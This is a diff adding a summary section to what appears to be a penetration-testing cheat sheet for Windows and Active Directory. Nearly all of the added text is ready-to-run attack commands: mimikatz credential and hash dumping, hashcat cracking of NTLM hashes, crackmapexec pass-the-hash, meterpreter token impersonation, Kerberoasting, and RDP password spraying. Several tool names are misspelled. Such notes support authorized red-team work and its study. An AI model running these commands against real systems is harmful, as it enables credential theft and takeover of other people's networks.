@@ -1,3 +1,41 @@
+# Summary
+
+Dump the credentials of all connected users, including cached hashes
+`./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`
+
+`./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"`
+
+`Cracking Ad Hashes`
+
+         ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+         ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+
+`PASS THE PW & HASH`
+
+         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
+         crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
+
+`Token Impersonation`
+     
+         meterpreter load icognito  
+         list_tokens  
+         impersonate_token <token>  
+
+`Kerberoasting`
+
+         Invoke-Kerberoast in powerview  
+         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
+         https://github.com/skelsec/kerberoast
+         GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
+
+`Password Spraying`
+
+ -   Create Password List  
+     `crunchy <length> <length> -t <pw-core>%%%% `
+   
+-    Spray  
+     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
+
 # Tools Introduction
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
 
